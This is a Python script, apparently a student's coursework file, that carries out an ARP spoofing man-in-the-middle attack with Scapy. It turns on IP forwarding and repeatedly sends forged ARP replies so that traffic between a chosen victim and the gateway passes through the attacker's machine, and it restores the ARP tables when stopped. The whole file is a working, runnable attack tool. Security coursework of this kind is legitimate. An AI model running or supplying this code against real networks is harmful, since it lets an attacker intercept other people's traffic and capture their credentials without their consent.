#!/usr/bin/env python3
"""
==============================================================
  ARP MitM Attack Script
  Autor   : Ashley Fabian
  Matrícula: 2025-0773
  Script  : AshleyFabian_2025-0773_ARP_MitM_P1.py
==============================================================
"""

import argparse
import time
import os
import sys
from scapy.all import ARP, Ether, send, sendp, get_if_hwaddr, getmacbyip, conf

def get_mac(ip):
    mac = getmacbyip(ip)
    if not mac:
        print(f"[!] No se pudo obtener MAC de {ip}")
        sys.exit(1)
    return mac

def enable_forward():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding habilitado.")

def disable_forward():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] IP Forwarding deshabilitado.")

def poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac):
    send(ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,
             psrc=gateway_ip, hwsrc=attacker_mac), verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victim_ip,  hwsrc=attacker_mac), verbose=False)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[*] Restaurando tablas ARP...")
    send(ARP(op=2, pdst=victim_ip,  hwdst=victim_mac,
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
             psrc=victim_ip,  hwsrc=victim_mac),  count=5, verbose=False)

def attack(iface, victim_ip, gateway_ip, delay):
    print("\n[*] ARP MitM Attack — Ashley Fabian (2025-0773)")
    enable_forward()
    conf.iface = iface
    attacker_mac = get_if_hwaddr(iface)
    victim_mac   = get_mac(victim_ip)
    gateway_mac  = get_mac(gateway_ip)
    print(f"[*] Víctima : {victim_ip} ({victim_mac})")
    print(f"[*] Gateway : {gateway_ip} ({gateway_mac})")
    print(f"[*] Atacante: {attacker_mac}\n")
    sent = 0
    try:
        while True:
            poison(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac)
            sent += 2
            print(f"[+] Paquetes ARP enviados: {sent}", end="\r")
            time.sleep(delay)
    except KeyboardInterrupt:
        restore(victim_ip, victim_mac, gateway_ip, gateway_mac)
        disable_forward()
        print(f"[*] Total enviados: {sent}")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iface",   required=True)
    parser.add_argument("-v", "--victim",  required=True)
    parser.add_argument("-g", "--gateway", required=True)
    parser.add_argument("-d", "--delay",   type=float, default=2)
    args = parser.parse_args()
    conf.verb = 0
    attack(args.iface, args.victim, args.gateway, args.delay)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[!] Ejecutar como root.")
        sys.exit(1)
    main()
